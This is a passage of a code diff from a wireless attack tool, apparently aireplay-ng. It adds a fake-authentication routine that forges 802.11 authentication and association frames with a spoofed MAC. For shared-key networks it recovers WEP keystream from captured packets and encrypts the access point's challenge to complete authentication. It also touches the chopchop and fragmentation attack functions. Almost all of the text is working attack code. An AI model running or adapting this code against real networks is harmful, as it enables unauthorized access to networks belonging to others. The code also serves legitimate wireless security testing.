+    struct timeval tv, tv2, tv3;
+
+    fd_set rfds;
+    int i, n, state, caplen;
+    int mi_b, mi_s, mi_d;
+    int x_send;
+//     int ret;
+    int kas;
+    int tries;
+    int abort;
+    int gotack = 0;
+    uchar capa[2];
+    int deauth_wait=3;
+    int ska=0;
+    int keystreamlen=0;
+    int challengelen=0;
+    int weight[16];
+    int notice=0;
+    int packets=0;
+
+    unsigned char ackbuf[14];
+    unsigned char ctsbuf[10];
+    unsigned char iv[4];
+    unsigned char challenge[2048];
+    unsigned char keystream[2048];
+
+
+    if( memcmp( opt.r_smac,  NULL_MAC, 6 ) == 0 )
+    {
+        printf( "Please specify a source MAC (-h).\n" );
         return( 1 );
     }
 
-    pkh.tv_sec  = tv.tv_sec;
-    pkh.tv_usec = tv.tv_usec;
-    pkh.caplen  = *caplen;
-    pkh.len     = *caplen;
+    if(getnet(capa, 0, 1) != 0)
+        return 1;
 
-    n = sizeof( pkh );
-
-    if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )
+    if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)
     {
-        perror( "fwrite failed" );
-        return( 1 );
+        printf( "Please specify an ESSID (-e).\n" );
+        return 1;
     }
 
-    n = pkh.caplen;
+    memcpy( ackbuf, "\xD4\x00\x00\x00", 4 );
+    memcpy( ackbuf +  4, opt.r_bssid, 6 );
+    memset( ackbuf + 10, 0, 4 );
 
-    if( fwrite( h80211, n, 1, f_cap_out ) != 1 )
+    memcpy( ctsbuf, "\xC4\x00\x94\x02", 4 );
+    memcpy( ctsbuf +  4, opt.r_bssid, 6 );
+
+    tries = 0;
+    abort = 0;
+    state = 0;
+    x_send=opt.npackets;
+    if(opt.npackets == 0)
+        x_send=4;
+
+    if(opt.prga != NULL)
+        ska=1;
+
+    tt = time( NULL );
+    tr = time( NULL );
+
+    while( 1 )
     {
-        perror( "fwrite failed" );
-        return( 1 );
-    }
+        switch( state )
+        {
+            case 0:
 
-    fclose( f_cap_out );
+                if(ska && keystreamlen == 0)
+                {
+                    opt.fast = 1;  //don't ask for approval
+                    memcpy(opt.f_bssid, opt.r_bssid, 6);    //make the filter bssid the same, that is used for auth'ing
+                    if(opt.prga==NULL)
+                    {
+                        while(keystreamlen < 16)
+                        {
+                            capture_ask_packet(&caplen, 1);    //wait for data packet
+                            memcpy(iv, h80211+24, 4); //copy IV+IDX
+                            i = known_clear(keystream, &keystreamlen, weight, h80211, caplen-24-4-4); //recover first bytes
+                            if(i>1)
+                            {
+                                keystreamlen=0;
+                            }
+                            for(i=0;i<keystreamlen;i++)
+                                keystream[i] ^= h80211[i+28];
+                        }
+                    }
+                    else
+                    {
+                        keystreamlen = opt.prgalen-4;
+                        memcpy(iv, opt.prga, 4);
+                        memcpy(keystream, opt.prga+4, keystreamlen);
+                    }
+                }
+
+                state = 1;
+                tt = time( NULL );
+
+                /* attempt to authenticate */
+
+                memcpy( h80211, AUTH_REQ, 30 );
+                memcpy( h80211 +  4, opt.r_bssid, 6 );
+                memcpy( h80211 + 10, opt.r_smac , 6 );
+                memcpy( h80211 + 16, opt.r_bssid, 6 );
+                if(ska)
+                    h80211[24]=0x01;
+
+                printf("\n");
+                PCT; printf( "Sending Authentication Request" );
+                if(!ska)
+                    printf(" (Open System)");
+                else
+                    printf(" (Shared Key)");
+                fflush( stdout );
+                gotack=0;
+
+                for( i = 0; i < x_send; i++ )
+                {
+                    if( send_packet( h80211, 30 ) < 0 )
+                        return( 1 );
+
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                }
+
+                break;
+
+            case 1:
+
+                /* waiting for an authentication response */
+
+                if( time( NULL ) - tt >= 2 )
+                {
+                    if(opt.npackets > 0)
+                    {
+                        tries++;
+
+                        if( tries > 15  )
+                        {
+                            abort = 1;
+                        }
+                    }
+                    else
+                    {
+                        if( x_send < 256 )
+                        {
+                            x_send *= 2;
+                        }
+                        else
+                        {
+                            abort = 1;
+                        }
+                    }
+
+                    if( abort )
+                    {
+                        printf(
+    "\nAttack was unsuccessful. Possible reasons:\n\n"
+    "    * Perhaps MAC address filtering is enabled.\n"
+    "    * Check that the BSSID (-a option) is correct.\n"
+    "    * Try to change the number of packets (-o option).\n"
+    "    * The driver/card doesn't support injection.\n"
+    "    * This attack sometimes fails against some APs.\n"
+    "    * The card is not on the same channel as the AP.\n"
+    "    * You're too far from the AP. Get closer, or lower\n"
+    "      the transmit rate.\n\n" );
+                        return( 1 );
+                    }
+
+                    state = 0;
+                    challengelen = 0;
+                    printf("\n");
+                }
+
+                break;
+
+            case 2:
+
+                state = 3;
+                tt = time( NULL );
+
+                /* attempt to authenticate using ska */
+
+                memcpy( h80211, AUTH_REQ, 30 );
+                memcpy( h80211 +  4, opt.r_bssid, 6 );
+                memcpy( h80211 + 10, opt.r_smac , 6 );
+                memcpy( h80211 + 16, opt.r_bssid, 6 );
+                h80211[1] |= 0x40; //set wep bit, as this frame is encrypted
+                memcpy(h80211+24, iv, 4);
+                memcpy(h80211+28, challenge, challengelen);
+                h80211[28] = 0x01; //its always ska in state==2
+                h80211[30] = 0x03; //auth sequence number 3
+                fflush(stdout);
+
+                if(keystreamlen < challengelen+4 && notice == 0)
+                {
+                    notice = 1;
+                    if(opt.prga != NULL)
+                    {
+                        PCT; printf( "Specified xor file (-y) is too short, you need at least %d keystreambytes.\n", challengelen+4);
+                    }
+                    else
+                    {
+                        PCT; printf( "You should specify a xor file (-y) with at least %d keystreambytes\n", challengelen+4);
+                    }
+                    PCT; printf( "Trying fragmented shared key fake auth.\n");
+                }
+                PCT; printf( "Sending encrypted challenge." );
+                fflush( stdout );
+                gotack=0;
+                gettimeofday(&tv2, NULL);
+
+                for( i = 0; i < x_send; i++ )
+                {
+                    if(keystreamlen < challengelen+4)
+                    {
+                        packets=(challengelen)/(keystreamlen-4);
+                        if( (challengelen)%(keystreamlen-4) != 0 )
+                            packets++;
+
+                        memcpy(h80211+24, challenge, challengelen);
+                        h80211[24]=0x01;
+                        h80211[26]=0x03;
+                        send_fragments(h80211, challengelen+24, iv, keystream, keystreamlen-4, 1);
+                    }
+                    else
+                    {
+                        add_icv(h80211, challengelen+28, 28);
+                        xor_keystream(h80211+28, keystream, challengelen+4);
+                        send_packet(h80211, 24+4+challengelen+4);
+                    }
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                }
+
+                break;
+
+            case 3:
+
+                /* waiting for an authentication response (using ska) */
+
+                if( time( NULL ) - tt >= 2 )
+                {
+                    if(opt.npackets > 0)
+                    {
+                        tries++;
+
+                        if( tries > 15  )
+                        {
+                            abort = 1;
+                        }
+                    }
+                    else
+                    {
+                        if( x_send < 256 )
+                        {
+                            x_send *= 2;
+                        }
+                        else
+                        {
+                            abort = 1;
+                        }
+                    }
+
+                    if( abort )
+                    {
+                        printf(
+    "\nAttack was unsuccessful. Possible reasons:\n\n"
+    "    * Perhaps MAC address filtering is enabled.\n"
+    "    * Check that the BSSID (-a option) is correct.\n"
+    "    * Try to change the number of packets (-o option).\n"
+    "    * The driver/card doesn't support injection.\n"
+    "    * This attack sometimes fails against some APs.\n"
+    "    * The card is not on the same channel as the AP.\n"
+    "    * You're too far from the AP. Get closer, or lower\n"
+    "      the transmit rate.\n\n" );
+                        return( 1 );
+                    }
+
+                    state = 0;
+                    challengelen=0;
+                    printf("\n");
+                }
+
+                break;
+
+            case 4:
+
+                tries = 0;
+                state = 5;
+                if(opt.npackets == -1) x_send *= 2;
+                tt = time( NULL );
+
+                /* attempt to associate */
+
+                memcpy( h80211, ASSOC_REQ, 28 );
+                memcpy( h80211 +  4, opt.r_bssid, 6 );
+                memcpy( h80211 + 10, opt.r_smac , 6 );
+                memcpy( h80211 + 16, opt.r_bssid, 6 );
+
+                n = strlen( opt.r_essid );
+                if( n > 32 ) n = 32;
+
+                h80211[28] = 0x00;
+                h80211[29] = n;
+
+                memcpy( h80211 + 30, opt.r_essid,  n );
+                memcpy( h80211 + 30 + n, RATES, 16 );
+                memcpy( h80211 + 24, capa, 2);
+
+                PCT; printf( "Sending Association Request" );
+                fflush( stdout );
+                gotack=0;
+
+                for( i = 0; i < x_send; i++ )
+                {
+                    if( send_packet( h80211, 46 + n ) < 0 )
+                        return( 1 );
+
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return( 1 );
+                }
+
+                break;
+
+            case 5:
+
+                /* waiting for an association response */
+
+                if( time( NULL ) - tt >= 5 )
+                {
+                    if( x_send < 256 && (opt.npackets == -1) )
+                        x_send *= 4;
+
+                    state = 0;
+                    challengelen = 0;
+                    printf("\n");
+                }
+
+                break;
+
+            case 6:
+
+                if( opt.a_delay == 0 )
+                {
+                    printf("\n");
+                    return( 0 );
+                }
+
+                if( time( NULL ) - tt >= opt.a_delay )
+                {
+                    if(opt.npackets == -1) x_send = 4;
+                    state = 0;
+                    challengelen = 0;
+                    break;
+                }
+
+                if( time( NULL ) - tr >= opt.delay )
+                {
+                    tr = time( NULL );
+                    printf("\n");
+                    PCT; printf( "Sending keep-alive packet" );
+                    fflush( stdout );
+                    gotack=0;
+
+                    memcpy( h80211, NULL_DATA, 24 );
+                    memcpy( h80211 +  4, opt.r_bssid, 6 );
+                    memcpy( h80211 + 10, opt.r_smac,  6 );
+                    memcpy( h80211 + 16, opt.r_bssid, 6 );
+
+                    if( opt.npackets > 0 ) kas = opt.npackets;
+                    else kas = 32;
+
+                    for( i = 0; i < kas; i++ )
+                        if( send_packet( h80211, 24 ) < 0 )
+                            return( 1 );
+                }
+
+                break;
+
+            default: break;
+        }
+
+        /* read one frame */
+
+        FD_ZERO( &rfds );
+        FD_SET( dev.fd_in, &rfds );
+
+        tv.tv_sec  = 1;
+        tv.tv_usec = 0;
+
+        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
+        {
+            if( errno == EINTR ) continue;
+            perror( "select failed" );
+            return( 1 );
+        }
+
+        if( ! FD_ISSET( dev.fd_in, &rfds ) )
+            continue;
+
+        caplen = read_packet( h80211, sizeof( h80211 ), NULL );
+
+        if( caplen  < 0 ) return( 1 );
+        if( caplen == 0 ) continue;
+
+        if( caplen == 10 && h80211[0] == 0xD4)
+        {
+            if( memcmp(h80211+4, opt.r_smac, 6) == 0 )
+            {
+                gotack++;
+                if(gotack==1)
+                {
+                    printf(" [ACK]");
+                    fflush( stdout );
+                }
+            }
+        }
+
+        gettimeofday(&tv3, NULL);
+
+        //wait 100ms for acks
+        if ( (((tv3.tv_sec*1000000 - tv2.tv_sec*1000000) + (tv3.tv_usec - tv2.tv_usec)) > (100*1000)) &&
+              (gotack > 0) && (gotack < packets) && (state == 3) && (packets > 1) )
+        {
+            PCT; printf("Not enough acks, repeating...\n");
+            state=2;
+            continue;
+        }
+
+        if( caplen < 24 )
+            continue;
+
+        switch( h80211[1] & 3 )
+        {
+            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
+            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
+            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
+            default: mi_b = 10; mi_d = 16; mi_s = 24; break;
+        }
+
+        /* check if the dest. MAC is ours and source == AP */
+
+        if( memcmp( h80211 + mi_d, opt.r_smac,  6 ) == 0 &&
+            memcmp( h80211 + mi_b, opt.r_bssid, 6 ) == 0 &&
+            memcmp( h80211 + mi_s, opt.r_bssid, 6 ) == 0 )
+        {
+            /* check if we got an deauthentication packet */
+
+            if( h80211[0] == 0xC0 ) //removed && state == 4
+            {
+                printf("\n");
+                PCT; printf( "Got a deauthentication packet! (Waiting %d seconds)\n", deauth_wait );
+                if(opt.npackets == -1) x_send = 4;
+                state = 0;
+                challengelen = 0;
+                read_sleep( deauth_wait * 1000000 );
+                deauth_wait += 2;
+                continue;
+            }
+
+            /* check if we got an disassociation packet */
+
+            if( h80211[0] == 0xA0 && state == 6 )
+            {
+                printf("\n");
+                PCT; printf( "Got a disassociation packet! (Waiting %d seconds)\n", deauth_wait );
+                if(opt.npackets == -1) x_send = 4;
+                state = 0;
+                challengelen = 0;
+                read_sleep( deauth_wait );
+                deauth_wait += 2;
+                continue;
+            }
+
+            /* check if we got an authentication response */
+
+            if( h80211[0] == 0xB0 && (state == 1 || state == 3) )
+            {
+                if(ska)
+                {
+                    if( (state==1 && h80211[26] != 0x02) || (state==3 && h80211[26] != 0x04) )
+                        continue;
+                }
+
+                printf("\n");
+                PCT;
+
+                state = 0;
+
+                if( caplen < 30 )
+                {
+                    printf( "Error: packet length < 30 bytes\n" );
+                    read_sleep( 3*1000000 );
+                    challengelen = 0;
+                    continue;
+                }
+
+                if( (h80211[24] != 0 || h80211[25] != 0) && ska==0)
+                {
+                    ska=1;
+                    printf("Switching to shared key authentication\n");
+                    read_sleep(2*1000000);  //read sleep 2s
+                    challengelen = 0;
+                    continue;
+                }
+
+                n = h80211[28] + ( h80211[29] << 8 );
+
+                if( n != 0 )
+                {
+                    switch( n )
+                    {
+                    case  1:
+                        printf( "AP rejects the source MAC address (%02X:%02X:%02X:%02X:%02X:%02X) ?\n",
+                                opt.r_smac[0], opt.r_smac[1], opt.r_smac[2],
+                                opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
+                        break;
+
+                    case 10:
+                        printf( "AP rejects our capabilities\n" );
+                        break;
+
+                    case 13:
+                    case 15:
+                        ska=1;
+                        if(h80211[26] == 0x02)
+                            printf("Switching to shared key authentication\n");
+                        if(h80211[26] == 0x04)
+                        {
+                            printf("Challenge failure\n");
+                            challengelen=0;
+                        }
+                        read_sleep(2*1000000);  //read sleep 2s
+                        challengelen = 0;
+                        continue;
+                    default:
+                        break;
+                    }
+
+                    printf( "Authentication failed (code %d)\n", n );
+                    if(opt.npackets == -1) x_send = 4;
+                    read_sleep( 3*1000000 );
+                    challengelen = 0;
+                    continue;
+                }
+
+                if(ska && h80211[26]==0x02 && challengelen == 0)
+                {
+                    memcpy(challenge, h80211+24, caplen-24);
+                    challengelen=caplen-24;
+                }
+                if(ska)
+                {
+                    if(h80211[26]==0x02)
+                    {
+                        state = 2;      /* grab challenge */
+                        printf( "Authentication 1/2 successful\n" );
+                    }
+                    if(h80211[26]==0x04)
+                    {
+                        state = 4;
+                        printf( "Authentication 2/2 successful\n" );
+                    }
+                }
+                else
+                {
+                    printf( "Authentication successful\n" );
+                    state = 4;      /* auth. done */
+                }
+            }
+
+            /* check if we got an association response */
+
+            if( h80211[0] == 0x10 && state == 5 )
+            {
+                printf("\n");
+                state = 0; PCT;
+
+                if( caplen < 30 )
+                {
+                    printf( "Error: packet length < 30 bytes\n" );
+                    sleep( 3 );
+                    challengelen = 0;
+                    continue;
+                }
+
+                n = h80211[26] + ( h80211[27] << 8 );
+
+                if( n != 0 )
+                {
+                    switch( n )
+                    {
+                    case  1:
+                        printf( "Denied (code  1), is WPA in use ?\n" );
+                        break;
+
+                    case 10:
+                        printf( "Denied (code 10), open (no WEP) ?\n" );
+                        break;
+
+                    case 12:
+                        printf( "Denied (code 12), wrong ESSID or WPA ?\n" );
+                        break;
+
+                    default:
+                        printf( "Association denied (code %d)\n", n );
+                        break;
+                    }
+
+                    sleep( 3 );
+                    challengelen = 0;
+                    continue;
+                }
+
+                printf( "Association successful :-)" );
+                deauth_wait = 3;
+                fflush( stdout );
+
+                tt = time( NULL );
+                tr = time( NULL );
+
+                state = 6;      /* assoc. done */
+            }
+        }
+    }
 
     return( 0 );
 }
@@ -1980,7 +1967,7 @@ int do_attack_interactive( void )
 
 read_packets:
 
-    if( capture_ask_packet( &caplen ) != 0 )
+    if( capture_ask_packet( &caplen, 0 ) != 0 )
         return( 1 );
 
     /* rewrite the frame control & MAC addresses */
@@ -2505,7 +2492,7 @@ int do_attack_chopchop( void )
 
     srand( time( NULL ) );
 
-    if( capture_ask_packet( &caplen ) != 0 )
+    if( capture_ask_packet( &caplen, 0 ) != 0 )
         return( 1 );
 
     if( (unsigned)caplen > sizeof(srcbuf) || (unsigned)caplen > sizeof(h80211) )
@@ -3135,64 +3122,6 @@ int make_arp_request(uchar *h80211, uchar *bssid, uchar *src_mac, uchar *dst_mac
     return 0;
 }
 
-void send_fragments(uchar *packet, int packet_len, uchar *iv, uchar *keystream, int fragsize)
-{
-    int t, u;
-    int data_size;
-    uchar frag[32+fragsize];
-    int pack_size;
-
-    data_size = packet_len - 24;
-
-    packet[23] = (rand() % 0xFF);
-
-    for (t=0; t+=fragsize;)
-    {
-
-    //Copy header
-        memcpy(frag, packet, 24);
-
-    //Copy IV + KeyIndex
-        memcpy(frag+24, iv, 4);
-
-    //Copy data
-        memcpy(frag+28, packet+24+t-fragsize, fragsize);
-
-    //Make ToDS frame
-        frag[1] |= 1;
-        frag[1] &= 253;
-
-    //Set fragment bit
-        if (t< data_size) frag[1] |= 4;
-        if (t==data_size) frag[1] &= 251;
-
-    //Fragment number
-        frag[22] = 0;
-        for (u=t; u-=fragsize;)
-        {
-            frag[22] += 1;
-        }
-//        frag[23] = 0;
-
-    //Calculate packet lenght
-        pack_size = 28 + fragsize;
-
-    //Add ICV
-        add_icv(frag, pack_size, 28);
-        pack_size += 4;
-
-    //Encrypt
-        xor_keystream(frag+28, keystream, fragsize+4);
-
-    //Send
-        send_packet(frag, pack_size);
-        if (t<data_size)usleep(100);
-
-        if (t>=data_size) break;
-    }
-
-}
-
 void save_prga(char *filename, uchar *iv, uchar *prga, int prgalen)
 {
     FILE *xorfile;
@@ -3266,7 +3195,7 @@ int do_attack_fragment()
     {
         round = 0;
 
-        if( capture_ask_packet( &caplen ) != 0 )
+        if( capture_ask_packet( &caplen, 0 ) != 0 )
             return -1;
 
         if((unsigned)caplen > sizeof(packet) || (unsigned)caplen > sizeof(packet2))
@@ -3315,7 +3244,7 @@ int do_attack_fragment()
                 packets++;
 
             PCT; printf("Sending fragmented packet\n");
-            send_fragments(h80211, arplen, iv, prga, prga_len-4);
+            send_fragments(h80211, arplen, iv, prga, prga_len-4, 0);
 //            //Plus an ACK
 //            send_packet(ack, 10);
 
@@ -3457,7 +3386,7 @@ int do_attack_fragment()
             if( (arplen-24)%(32) != 0 )
                 packets++;
 
-            send_fragments(h80211, arplen, iv, prga, 32);
+            send_fragments(h80211, arplen, iv, prga, 32, 0);
 //            //Plus an ACK
 //            send_packet(ack, 10);
 
@@ -3575,7 +3504,7 @@ int do_attack_fragment()
             if( (arplen-24)%(300) != 0 )
                 packets++;
 
-            send_fragments(h80211, arplen, iv, prga, 300);
+            send_fragments(h80211, arplen, iv, prga, 300, 0);
 //            //Plus an ACK
 //            send_packet(ack, 10);
 
